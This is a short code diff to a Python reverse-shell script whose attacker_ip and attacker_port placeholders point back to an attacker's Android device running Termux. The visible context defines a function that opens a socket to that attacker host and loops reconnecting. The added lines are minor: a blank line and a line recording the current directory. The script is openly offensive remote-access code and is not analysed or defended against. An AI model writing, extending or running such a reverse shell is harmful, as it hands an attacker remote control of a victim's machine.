@@ -41,6 +41,7 @@ import time
 attacker_ip = '{host}'  # Replace with your Android device's IP
 attacker_port = {port}   # The port you are listening on in Termux
 
+
 def connect_shell():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -50,6 +51,9 @@ def connect_shell():
     except Exception as e:
         print(f"Connection failed: {e}")
         return None
+        
+# Start in the user's home directory
+current_directory = os.getcwd()
 
 while True:
     sock = connect_shell()
